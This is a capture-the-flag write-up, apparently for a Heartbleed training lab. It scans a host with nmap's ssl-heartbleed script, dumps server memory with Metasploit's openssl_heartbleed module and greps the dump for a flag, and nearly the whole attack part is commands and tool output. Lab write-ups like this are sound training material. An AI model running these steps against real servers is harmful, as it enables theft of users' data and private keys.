# HeartBleed - SSL issues are still lurking in the wild! Can you exploit this web servers OpenSSL?

## Finding  exploitable services with nmap and script ssl-heartbleed
```
nmap --script ssl-heartbleed 34.242.207.212
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-06 07:49 BST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 07:49 (0:00:00 remaining)
Nmap scan report for ec2-34-242-207-212.eu-west-1.compute.amazonaws.com (34.242.207.212)
Host is up (0.00034s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds

```

## Using metasploit 

Commands used
```
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOST <IP ADDRESS>
set action DUMP
run
```

```
root@ip-10-10-13-110:~# msfconsole
Metasploit tip: The use command supports fuzzy searching to try and 
select the intended module, e.g. use kerberos/get_ticket or use 
kerberos forge silver ticket
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.4.55-dev-                         ]
+ -- --=[ 2467 exploits - 1271 auxiliary - 431 post       ]
+ -- --=[ 1472 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search 2014-0160

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
   2    \_ action: DUMP                                 .                .       .      Dump memory contents to loot
   3    \_ action: KEYS                                 .                .       .      Recover private keys from memory
   4    \_ action: SCAN                                 .                .       .      Check hosts for vulnerability


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/ssl/openssl_heartbleed
After interacting with a module you can manually set a ACTION with set ACTION 'SCAN'

msf6 > use 1
[*] Using action SCAN - view all 3 actions with the show actions command
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memor
                                                y before storing
   LEAK_COUNT        1                yes       Number of times to leak memory
                                                 per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for
                                                a server response
   RHOSTS                             yes       The target host(s), see https:
                                                //docs.metasploit.com/docs/usi
                                                ng-metasploit/basics/using-met
                                                asploit.html
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dum
                                                p status
   THREADS           1                yes       The number of concurrent threa
                                                ds (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use
                                                 raw TLS sockets (Accepted: No
                                                ne, SMTP, IMAP, JABBER, POP3,
                                                FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accept
                                                ed: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOST 34.242.207.212
RHOST => 34.242.207.212
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > info

       Name: OpenSSL Heartbeat (Heartbleed) Information Leak
     Module: auxiliary/scanner/ssl/openssl_heartbleed
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2014-04-07

Provided by:
  Neel Mehta
  Riku
  Antti
  Matti
  Jared Stafford <jspenguin@jspenguin.org>
  FiloSottile
  Christian Mehlmauer <FireFart@gmail.com>
  wvu <wvu@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>
  Sebastiano Di Paola
  Tom Sellers
  jjarmoc
  Ben Buchanan
  herself

Available actions:
    Name  Description
    ----  -----------
    DUMP  Dump memory contents to loot
    KEYS  Recover private keys from memory
=>  SCAN  Check hosts for vulnerability

Check supported:
  Yes

Basic options:
  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  DUMPFILTER                         no        Pattern to filter leaked memory
                                                before storing
  LEAK_COUNT        1                yes       Number of times to leak memory
                                               per SCAN or DUMP invocation
  MAX_KEYTRIES      50               yes       Max tries to dump key
  RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a
                                                server response
  RHOSTS            34.242.207.212   yes       The target host(s), see https:/
                                               /docs.metasploit.com/docs/using
                                               -metasploit/basics/using-metasp
                                               loit.html
  RPORT             443              yes       The target port (TCP)
  STATUS_EVERY      5                yes       How many retries until key dump
                                                status
  THREADS           1                yes       The number of concurrent thread
                                               s (max one per host)
  TLS_CALLBACK      None             yes       Protocol to use, "None" to use
                                               raw TLS sockets (Accepted: None
                                               , SMTP, IMAP, JABBER, POP3, FTP
                                               , POSTGRES)
  TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepte
                                               d: SSLv3, 1.0, 1.1, 1.2)

Description:
  This module implements the OpenSSL Heartbleed attack. The problem
  exists in the handling of heartbeat requests, where a fake length can
  be used to leak memory data in the response. Services that support
  STARTTLS may also be vulnerable.

  The module supports several actions, allowing for scanning, dumping of
  memory contents to loot, and private key recovery.

  The LEAK_COUNT option can be used to specify leaks per SCAN or DUMP.

  The repeat command can be used to make running the SCAN or DUMP many
  times more powerful. As in:
      repeat -t 60 run; sleep 2
  To run every two seconds for one minute.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2014-0160
  https://www.kb.cert.org/vuls/id/720951
  https://www.cisa.gov/uscert/ncas/alerts/TA14-098A
  https://heartbleed.com/
  https://github.com/FiloSottile/Heartbleed
  https://gist.github.com/takeshixx/10107280
  https://filippo.io/Heartbleed/

Also known as:
  Heartbleed


View the full module info with the info -d command.

msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
action => DUMP
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run
[+] 34.242.207.212:443    - Heartbeat response with leak, 44883 bytes
[+] 34.242.207.212:443    - Heartbeat data stored in /root/.msf4/loot/20250406075625_default_34.242.207.212_openssl.heartble_474917.bin
[*] 34.242.207.212:443    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > 

```

## Using strings to find the flag from the dump
```
strings /root/.msf4/loot/20250406075625_default_34.242.207.212_openssl.heartble_474917.bin | grep THM
user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{***********}

```